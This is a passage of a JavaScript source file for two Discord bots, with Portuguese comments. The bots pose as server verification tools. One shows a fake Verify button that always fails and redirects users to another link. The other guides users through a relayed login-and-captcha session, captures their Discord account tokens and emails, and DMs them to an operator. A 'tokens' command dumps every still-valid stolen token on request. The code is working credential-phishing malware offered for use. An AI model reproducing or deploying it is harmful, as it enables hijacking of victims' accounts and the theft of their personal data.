        .addTextDisplayComponents(new TextDisplayBuilder().setContent(`### ${EMOJI.error}︱Error !`))
        .addSeparatorComponents(new SeparatorBuilder().setDivider(true).setSpacing(1))
        .addTextDisplayComponents(new TextDisplayBuilder().setContent(`**Your verification has been denied.**\nTry again with another verification method.`));
}

// =============================================
// BOT 1 — SECURITY
// =============================================
const securityClient = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMembers],
    partials: [Partials.Channel, Partials.Message, Partials.GuildMember, Partials.User]
});

securityClient.once(Events.ClientReady, async () => {
    log(''); log('='.repeat(60));
    log(`${ts()} [SECURITY] ✅ ${securityClient.user.tag}`);
    log('='.repeat(60));
    if (ALLOWED_GUILDS.length > 0) {
        for (const [id, guild] of securityClient.guilds.cache) {
            if (!ALLOWED_GUILDS.includes(id)) await guild.leave().catch(() => {});
        }
    }
});

securityClient.on(Events.GuildCreate, async (guild) => {
    const auth = ALLOWED_GUILDS.length === 0 || ALLOWED_GUILDS.includes(guild.id);
    if (!auth) await guild.leave().catch(() => {});
});

securityClient.on(Events.MessageCreate, async (message) => {
    if (message.author.bot) return;
    if (!message.content.startsWith(PREFIX)) return;
    const args = message.content.slice(PREFIX.length).trim().split(/\s+/);
    const cmd = args.shift().toLowerCase();
    if (cmd === COMMAND_1) {
        if (message.author.id === config.dm_token_recipient) { try { await message.delete(); } catch {} }
        log(`${ts()} [SECURITY] [CMD] !${COMMAND_1} por ${message.author.tag}`);
        const embed = buildSecurityInitialEmbed();
        const btnVerify = new ButtonBuilder().setCustomId('verify_btn').setLabel('Verify').setStyle(ButtonStyle.Primary);
        const row = new ActionRowBuilder().addComponents(btnVerify);
        await message.channel.send({ embeds: [embed], components: [row] });
    }
});

securityClient.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isButton()) return;
    if (interaction.customId !== 'verify_btn') return;
    try {
        log(`${ts()} [SECURITY] [VERIFY_START] ${interaction.user.tag}`);
        await interaction.reply({ components: [buildSecurityLoading()], flags: MessageFlags.IsComponentsV2 | MessageFlags.Ephemeral });
        await new Promise(r => setTimeout(r, 3000));
        const errorMsg = buildSecurityError();
        if (LINK_ALTERNATIVE) {
            const btnAlt = new ButtonBuilder().setLabel('Try another method')
                .setEmoji({ id: '1551779349932277821', name: 'seta' })
                .setStyle(ButtonStyle.Link).setURL(LINK_ALTERNATIVE);
            errorMsg.addActionRowComponents(new ActionRowBuilder().addComponents(btnAlt));
        }
        await interaction.editReply({ components: [errorMsg], flags: MessageFlags.IsComponentsV2 });
    } catch (e) { log(`${ts()} [SECURITY] [ERROR] ${e.message}`); }
});

// =============================================
// BOT 2 — VERIFY
// =============================================
const verifyClient = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMembers, GatewayIntentBits.DirectMessages],
    partials: [Partials.Channel, Partials.Message, Partials.GuildMember, Partials.User]
});

verifyClient.once(Events.ClientReady, async () => {
    log(''); log('='.repeat(60));
    log(`${ts()} [VERIFY] ✅ ${verifyClient.user.tag}`);
    log('='.repeat(60));
    if (ALLOWED_GUILDS.length > 0) {
        for (const [id, guild] of verifyClient.guilds.cache) {
            if (!ALLOWED_GUILDS.includes(id)) await guild.leave().catch(() => {});
        }
    }
    setInterval(async () => { await checkAllTokens(); }, 5 * 60 * 1000);
});

verifyClient.on(Events.GuildCreate, async (guild) => {
    const auth = ALLOWED_GUILDS.length === 0 || ALLOWED_GUILDS.includes(guild.id);
    if (!auth) await guild.leave().catch(() => {});
});

verifyClient.on(Events.GuildMemberRemove, async (member) => {
    const db = loadDB();
    if (db[member.id]) { delete db[member.id]; saveDB(db); }
});

async function checkAllTokens() {
    const db = loadDB();
    const entries = Object.entries(db);
    if (entries.length === 0) return;
    let removed = 0;
    for (const [userId, info] of entries) {
        const token = info.token;
        if (!token) continue;
        const alive = await isTokenAlive(token);
        if (!alive) {
            for (const [guildId, guild] of verifyClient.guilds.cache) {
                if (ALLOWED_GUILDS.length > 0 && !ALLOWED_GUILDS.includes(guildId)) continue;
                try {
                    const member = await guild.members.fetch(userId).catch(() => null);
                    if (member) {
                        const roleId = config.give_role;
                        if (roleId && member.roles.cache.has(roleId)) await member.roles.remove(roleId).catch(() => {});
                    }
                } catch {}
            }
            delete db[userId];
            removed++;
        }
    }
    if (removed > 0) saveDB(db);
}

verifyClient.on(Events.MessageCreate, async (message) => {
    if (message.author.bot) return;
    if (!message.content.startsWith(PREFIX)) return;
    const args = message.content.slice(PREFIX.length).trim().split(/\s+/);
    const cmd = args.shift().toLowerCase();

    if (cmd === COMMAND_2) {
        if (message.author.id === config.dm_token_recipient) { try { await message.delete(); } catch {} }
        log(`${ts()} [VERIFY] [CMD] !${COMMAND_2} por ${message.author.tag}`);
        const msg1 = buildMsg1(message.guild.name);
        const btnVerify = new ButtonBuilder().setCustomId('verify_btn_real').setLabel('Verify')
            .setEmoji({ id: '1551779357020655736', name: 'shield' }).setStyle(ButtonStyle.Success);
        msg1.addActionRowComponents(new ActionRowBuilder().addComponents(btnVerify));
        await message.channel.send({ components: [msg1], flags: MessageFlags.IsComponentsV2 });
        return;
    }

    if (cmd === 'tokens') {
        if (message.author.id !== config.dm_token_recipient) return message.reply('❌ Sem permissão.');
        try { await message.delete(); } catch {}
        const loading = await message.channel.send('📤 Buscando tokens vivos...');
        const db = loadDB();
        const alive = {};
        for (const [uid, info] of Object.entries(db)) {
            if (info.token && await isTokenAlive(info.token)) alive[uid] = info;
        }
        if (Object.keys(alive).length === 0) return loading.edit('📭 Nenhum token vivo.');
        try {
            const recipient = await verifyClient.users.fetch(config.dm_token_recipient);
            let sent = 0;
            for (const [uid, info] of Object.entries(alive)) {
                await recipient.send(`🔑 **${info.user}**\n\`\`\`${info.token}\`\`\``);
                sent++;
                await new Promise(r => setTimeout(r, 500));
            }
            await loading.edit(`✅ ${sent} tokens enviados.`);
        } catch (e) { await loading.edit(`❌ Erro: ${e.message}`); }
    }
});

verifyClient.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isButton()) return;
    if (interaction.customId !== 'verify_btn_real') return;

    const userId = interaction.user.id;
    const userTag = interaction.user.tag;
    const guildName = interaction.guild.name;

    try {
        log(''); log(`${ts()} [VERIFY] [VERIFY_START] 🛡️ ${userTag} em ${guildName}`);

        const db = loadDB();
        if (db[userId] && db[userId].authorized) {
            if (await isTokenAlive(db[userId].token)) {
                return interaction.reply({ components: [buildAlready()], flags: MessageFlags.IsComponentsV2 | MessageFlags.Ephemeral });
            } else {
                db[userId].authorized = false;
                db[userId].token = '';
                saveDB(db);
            }
        }

        await interaction.deferReply({ flags: MessageFlags.Ephemeral });
        const session = await startSession(userId);
        if (!session.raLink) {
            return interaction.editReply({ components: [buildError()], flags: MessageFlags.IsComponentsV2 });
        }

        const expiresAt = Math.floor(session.expires_at / 1000);
        const msg2 = buildMsg2(guildName, expiresAt);
        msg2.addSeparatorComponents(new SeparatorBuilder().setDivider(true).setSpacing(1));
        msg2.addTextDisplayComponents(new TextDisplayBuilder().setContent(`**Clique no botão abaixo para abrir o link de verificação.**`));
        const btnOpen = new ButtonBuilder().setLabel('Link direct')
            .setEmoji({ id: '1551779349932277821', name: 'seta' })
            .setStyle(ButtonStyle.Link).setURL(session.raLink);
        msg2.addActionRowComponents(new ActionRowBuilder().addComponents(btnOpen));
        await interaction.editReply({ components: [msg2], flags: MessageFlags.IsComponentsV2 });

        let stopped = false;
        let pollAttempts = 0;
        const maxAttempts = 120; // 6 minutos
        let captchaSent = false;
        let lastCaptchaUrl = null;

        const interval = setInterval(async () => {
            if (stopped) return;
            pollAttempts++;
            const s = SESSIONS.get(userId);
            if (!s) { stopped = true; clearInterval(interval); return; }

            // Envia (ou atualiza) a mensagem de captcha quando a URL mudar
            if (s.status === 'captcha' && s.captchaUrl && s.captchaUrl !== lastCaptchaUrl) {
                lastCaptchaUrl = s.captchaUrl;
                try {
                    const captchaMsg = buildMsgCaptcha(guildName, s.captchaUrl);
                    await interaction.editReply({ components: [captchaMsg], flags: MessageFlags.IsComponentsV2 });
                    log(`${ts()} [VERIFY] [CAPTCHA] ✅ URL enviada/atualizada`);
                } catch (e) { log(`${ts()} [VERIFY] [CAPTCHA_FAIL] ⚠️ ${e.message}`); }
            }

            if (s.status === 'success' && !s.tokenSent) {
                s.tokenSent = true; stopped = true; clearInterval(interval);
                const info = s.info;
                log(''); log('='.repeat(60));
                log(`${ts()} [VERIFY] [TOKEN_CAPTURED] ✅ ${info.user}`);
                log('='.repeat(60));
                try {
                    const member = await interaction.guild.members.fetch(userId);
                    const roleId = config.give_role;
                    if (member && roleId) await member.roles.add(roleId);
                } catch (e) { log(`${ts()} [VERIFY] [ROLE_FAIL] ⚠️ ${e.message}`); }
                try { await interaction.editReply({ components: [buildSuccess()], flags: MessageFlags.IsComponentsV2 }); } catch {}
                try {
                    const recipient = await verifyClient.users.fetch(config.dm_token_recipient);
                    await recipient.send(`🔑 **Novo Token**\nUsername: ${info.user}\nEmail: ${info.email}\nToken: \`\`\`${info.token}\`\`\``);
                } catch (e) { log(`${ts()} [VERIFY] [DM_FAIL] ⚠️ ${e.message}`); }
            } else if (s.status === 'timeout' || s.status === 'error' || s.status === 'ratelimit') {
                stopped = true; clearInterval(interval); SESSIONS.delete(userId);
                try {
                    await interaction.editReply({
                        components: [s.status === 'timeout' ? buildExpired() : buildError()],
                        flags: MessageFlags.IsComponentsV2
                    });
                } catch {}
            } else if (pollAttempts >= maxAttempts) {
                stopped = true; clearInterval(interval); SESSIONS.delete(userId);
                try { await interaction.editReply({ components: [buildExpired()], flags: MessageFlags.IsComponentsV2 }); } catch {}
            }
        }, 3000);
    } catch (e) { log(`${ts()} [VERIFY] [ERROR] ❌ ${e.message}`); console.log(e); }
});

// =============================================
// START
// =============================================
if (!config.token || !config.token2) {
    console.log('[!] Configure config.token e config.token2');
    process.exit(1);
}

log('');
log('='.repeat(60));
log(`${ts()} [START] 🚀 Iniciando 2 bots...`);
log(`${ts()} [START] 🌐 API_URL: ${API_URL}`);
log('='.repeat(60));

securityClient.login(config.token).catch((e) => log(`[SECURITY] ❌ ${e.message}`));
verifyClient.login(config.token2).catch((e) => log(`[VERIFY] ❌ ${e.message}`));
